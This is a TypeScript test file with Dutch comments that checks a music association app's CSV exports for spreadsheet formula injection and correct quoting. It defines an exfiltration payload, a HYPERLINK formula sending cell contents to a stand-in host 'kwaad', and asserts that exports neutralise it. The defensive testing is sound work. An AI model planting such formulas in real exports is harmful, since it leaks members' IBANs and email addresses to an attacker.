/**
 * De CSV-exports van de boekhouding, de uitwisseling en de overzichten.
 *
 * Deze drie bouwden hun bestand elk op hun eigen manier, en geen van de drie
 * hield rekening met formule-injectie. Een cel die begint met `=`, `+`, `-` of
 * `@` wordt door Excel, LibreOffice en Google Sheets uitgevoerd zodra iemand
 * het bestand opent. Een relatie die `=HYPERLINK("http://kwaad/"&A1,"klik")`
 * heet stuurt zo de inhoud van de export - in de relatielijst zijn dat IBAN's
 * en e-mailadressen - naar een adres van de aanvaller, en de penningmeester
 * ziet alleen een linkje. Dat is het verraderlijke: bij een structurele breuk
 * merkt de ontvanger dat er iets mis is, hier juist niet.
 *
 * Aanhalingstekens beschermen hier niet tegen. Ze zijn CSV-syntaxis en worden
 * bij het inlezen weggehaald voordat de cel geëvalueerd wordt. Daarom een
 * apostrof voor de waarde: die zegt tegen de spreadsheet "dit is tekst", en
 * wordt in de cel zelf niet getoond.
 *
 * analytics.ts had daarnaast ook het structurele probleem: elk tekstveld kreeg
 * daar aanhalingstekens omheen zonder de aanhalingstekens erin te verdubbelen.
 */

import { describe, it, expect, beforeEach } from 'vitest';
import request from 'supertest';
import express from 'express';
import rateLimit from 'express-rate-limit';
import { v4 as uuidv4 } from 'uuid';
import '../setup';
import db from '../../database/connection';
import accountingRoutes from '../../routes/accounting';
import interopRoutes from '../../routes/interop';
import analyticsRoutes from '../../routes/analytics';
import { errorHandler } from '../../middleware/errorHandler';
import { invalidateAllCache } from '../../middleware/cache';
import { createTestEnvironment, createTestMusicPiece, createTestOrchestra, createTestUser } from '../testUtils';

const app = express();
app.use(express.json());
app.use('/api', rateLimit({ windowMs: 60_000, limit: 10_000 }));
app.use('/api/accounting', accountingRoutes);
app.use('/api/interop', interopRoutes);
app.use('/api/analytics', analyticsRoutes);
app.use(errorHandler);

/** De aanval waar het om gaat: haalt gegevens uit het bestand naar buiten. */
const AANVAL = '=HYPERLINK("http://kwaad/"&A1,"klik hier")';

let beheerderToken: string;
let vereniging: string;
let beheerderId: string;

beforeEach(() => {
  const omgeving = createTestEnvironment();
  beheerderToken = omgeving.adminToken;
  vereniging = omgeving.association.id;
  beheerderId = omgeving.adminUser.id;
  invalidateAllCache();
});

const haalOp = (pad: string) => request(app).get(pad).set('Authorization', `Bearer ${beheerderToken}`);

/** De cellen van een regel, zonder de BOM en zonder de aanhalingstekens. */
function cellen(regel: string, scheidingsteken: ',' | ';'): string[] {
  const uit: string[] = [];
  let veld = '';
  let inQuote = false;
  for (let i = 0; i < regel.length; i++) {
    const teken = regel[i];
    if (inQuote) {
      if (teken === '"' && regel[i + 1] === '"') {
        veld += '"';
        i++;
      } else if (teken === '"') {
        inQuote = false;
      } else {
        veld += teken;
      }
    } else if (teken === '"') {
      inQuote = true;
    } else if (teken === scheidingsteken) {
      uit.push(veld);
      veld = '';
    } else {
      veld += teken;
    }
  }
  uit.push(veld);
  return uit;
}

/** De regels van een antwoord, zonder BOM en zonder lege slotregel. */
function regels(tekst: string): string[] {
  return tekst
    .replace(/^\uFEFF/, '')
    .trim()
    .split('\n');
}

describe('de boekhoudexports (accounting.ts)', () => {
  function maakRelatie(naam: string, overrides: { iban?: string; city?: string } = {}): void {
    db.prepare(
      `INSERT INTO accounting_relations (id, association_id, relation_type, relation_number, name, email, iban, city)
       VALUES (?, ?, 'customer', 'REL-001', ?, 'lid@test.nl', ?, ?)`,
    ).run(uuidv4(), vereniging, naam, overrides.iban ?? 'NL91ABNA0417164300', overrides.city ?? 'Utrecht');
  }

  it('voert een relatienaam die een formule is niet uit', async () => {
    maakRelatie(AANVAL);

    const res = await haalOp('/api/accounting/export/relations');
    expect(res.status).toBe(200);

    const rij = regels(res.text).find((r) => r.includes('HYPERLINK'))!;
    const naam = cellen(rij, ';')[1];

    // Zonder de apostrof staat hier `=HYPERLINK(...)` en voert Excel dat uit
    // zodra de penningmeester het bestand opent.
    expect(naam.startsWith("'")).toBe(true);
    expect(naam).not.toMatch(/^=/);
  });

  it.each(['+31612345678', '-korting op contributie', '@iedereen'])('voert ook %j niet uit', async (gevaarlijk) => {
    maakRelatie(gevaarlijk);

    const res = await haalOp('/api/accounting/export/relations');
    const rij = regels(res.text)[1];

    expect(cellen(rij, ';')[1].startsWith("'")).toBe(true);
  });

  it('houdt de puntkomma als scheidingsteken en de komma als decimaalteken', async () => {
    // Dat is wat Excel in deze regio verwacht; een export die daarvan afwijkt
    // breekt de import bij iedereen die hem al gebruikt.
    db.prepare(
      `INSERT INTO accounting_relations (id, association_id, relation_type, name, credit_limit)
       VALUES (?, ?, 'customer', 'Muziekhandel Bruggen', 1250.5)`,
    ).run(uuidv4(), vereniging);

    const res = await haalOp('/api/accounting/export/relations');
    const koppen = cellen(regels(res.text)[0], ';');
    const rij = cellen(regels(res.text)[1], ';');

    // Deze twee stonden er al goed in en horen dat te blijven: de omzetting
    // naar het gedeelde hulpje mag de vorm van het bestand niet veranderen.
    expect(koppen.slice(0, 3)).toEqual(['Relatienummer', 'Naam', 'Type']);
    expect(rij[koppen.indexOf('Kredietlimiet')]).toBe('1250,5');
  });

  it('houdt een puntkomma in een adres binnen zijn eigen kolom', async () => {
    maakRelatie('Muziekhandel Bruggen', { city: 'Utrecht; achterom' });

    const res = await haalOp('/api/accounting/export/relations');
    const koppen = cellen(regels(res.text)[0], ';');
    const rij = cellen(regels(res.text)[1], ';');

    expect(rij).toHaveLength(koppen.length);
    expect(rij[koppen.indexOf('Plaats')]).toBe('Utrecht; achterom');
  });

  it('laat een negatief saldo een getal blijven', async () => {
    // Een bedrag met een apostrof ervoor is in de kolom niet meer op te
    // tellen; bij een getal weten we dat het geen formule is.
    db.prepare(
      `INSERT INTO accounting_relations (id, association_id, relation_type, name, balance)
       VALUES (?, ?, 'customer', 'Openstaand Lid', -12.5)`,
    ).run(uuidv4(), vereniging);

    const res = await haalOp('/api/accounting/export/relations');
    const koppen = cellen(regels(res.text)[0], ';');
    const rij = cellen(regels(res.text)[1], ';');

    expect(rij[koppen.indexOf('Saldo')]).toBe('-12,5');
  });
});

describe('de repertoire-export (interop.ts)', () => {
  function zetOpRepertoire(orchestraId: string, titel: string, overrides: { grade?: string } = {}): void {
    db.prepare('INSERT INTO music_titles (id, title, grade, association_id) VALUES (?, ?, ?, ?)').run(
      uuidv4(),
      titel,
      overrides.grade ?? null,
      vereniging,
    );
    const partij = createTestMusicPiece(vereniging, { title: titel, arranger: null });
    const lijstId = uuidv4();
    db.prepare('INSERT INTO music_lists (id, name, orchestra_id) VALUES (?, ?, ?)').run(
      lijstId,
      `Lijst ${titel}`,
      orchestraId,
    );
    db.prepare('INSERT INTO music_list_pieces (music_list_id, music_piece_id) VALUES (?, ?)').run(lijstId, partij.id);
  }

  it('voert een titel die een formule is niet uit', async () => {
    const orkest = createTestOrchestra(vereniging, { name: 'Harmonieorkest' });
    zetOpRepertoire(orkest.id, AANVAL);

    const res = await haalOp(`/api/interop/orchestras/${orkest.id}/repertoire.csv`);
    expect(res.status).toBe(200);

    const rij = regels(res.text).find((r) => r.includes('HYPERLINK'))!;
    const titel = cellen(rij, ',')[1];

    expect(titel.startsWith("'")).toBe(true);
    expect(titel).not.toMatch(/^=/);
  });

  it('houdt een komma in de moeilijkheidsgraad binnen zijn eigen kolom', async () => {
    const orkest = createTestOrchestra(vereniging, { name: 'Harmonieorkest' });
    zetOpRepertoire(orkest.id, 'Lastig Stuk', { grade: '4, zware 4' });

    const res = await haalOp(`/api/interop/orchestras/${orkest.id}/repertoire.csv`);
    const koppen = cellen(regels(res.text)[0], ',');
    const rij = cellen(regels(res.text)[1], ',');

    expect(rij).toHaveLength(koppen.length);
    expect(rij[koppen.indexOf('Graad')]).toBe('4, zware 4');
  });
});

describe('het activiteitenoverzicht (analytics.ts)', () => {
  function logActiviteit(userId: string, actie: string, soort: string, entiteitId: string): void {
    db.prepare(
      'INSERT INTO activity_log (id, user_id, action_type, entity_type, entity_id) VALUES (?, ?, ?, ?, ?)',
    ).run(uuidv4(), userId, actie, soort, entiteitId);
  }

  it('voert een stuktitel die een formule is niet uit', async () => {
    const stuk = createTestMusicPiece(vereniging, { title: AANVAL });
    logActiviteit(beheerderId, 'download', 'music_piece', stuk.id);

    const res = await haalOp('/api/analytics/activity/export?reportType=content_activity');
    expect(res.status).toBe(200);

    const rij = regels(res.text).find((r) => r.includes('HYPERLINK'))!;
    const titel = cellen(rij, ',')[1];

    expect(titel.startsWith("'")).toBe(true);
    expect(titel).not.toMatch(/^=/);
  });

  it('voert een lidnaam die een formule is niet uit', async () => {
    createTestUser(vereniging, { email: `formule-${uuidv4()}@test.nl`, firstName: '=1+1', lastName: 'Vries' });

    const res = await haalOp('/api/analytics/activity/export?reportType=member_activity');
    expect(res.status).toBe(200);

    const rij = regels(res.text).find((r) => r.includes('1+1'))!;
    const naam = cellen(rij, ',')[1];

    expect(naam.startsWith("'")).toBe(true);
    expect(naam).not.toMatch(/^=/);
  });

  it('houdt een aanhalingsteken in een lidnaam binnen zijn eigen kolom', async () => {
    // Hier werd elk veld wel gequoot maar werden de aanhalingstekens erin niet
    // verdubbeld: alles na deze naam schoof een kolom op, dus de downloads van
    // dit lid kwamen in de e-mailkolom terecht.
    createTestUser(vereniging, {
      email: `bassie-${uuidv4()}@test.nl`,
      firstName: 'Jan "Bassie"',
      lastName: 'de Vries',
    });

    const res = await haalOp('/api/analytics/activity/export?reportType=member_activity');
    const koppen = cellen(regels(res.text)[0], ',');
    const rij = cellen(
      regels(res.text).find((r) => r.includes('Bassie'))!,
      ',',
    );

    expect(rij).toHaveLength(koppen.length);
    expect(rij[koppen.indexOf('Member Name')]).toBe('Jan "Bassie" de Vries');
    expect(rij[koppen.indexOf('Email')]).toContain('@test.nl');
  });

  it('houdt een aanhalingsteken in een stuktitel binnen zijn eigen kolom', async () => {
    const stuk = createTestMusicPiece(vereniging, { title: 'Jan "Bassie" Mars' });
    logActiviteit(beheerderId, 'download', 'music_piece', stuk.id);

    const res = await haalOp('/api/analytics/activity/export?reportType=content_activity');
    const koppen = cellen(regels(res.text)[0], ',');
    const rij = cellen(
      regels(res.text).find((r) => r.includes('Bassie'))!,
      ',',
    );

    expect(rij).toHaveLength(koppen.length);
    expect(rij[koppen.indexOf('Title')]).toBe('Jan "Bassie" Mars');
  });

  it('houdt een komma in een stuktitel binnen zijn eigen kolom', async () => {
    const stuk = createTestMusicPiece(vereniging, { title: 'Bach, Johann Sebastian' });
    logActiviteit(beheerderId, 'view', 'music_piece', stuk.id);

    const res = await haalOp('/api/analytics/activity/export?reportType=content_activity');
    const koppen = cellen(regels(res.text)[0], ',');
    const rij = cellen(
      regels(res.text).find((r) => r.includes('Bach'))!,
      ',',
    );

    expect(rij).toHaveLength(koppen.length);
    expect(rij[koppen.indexOf('Title')]).toBe('Bach, Johann Sebastian');
  });
});
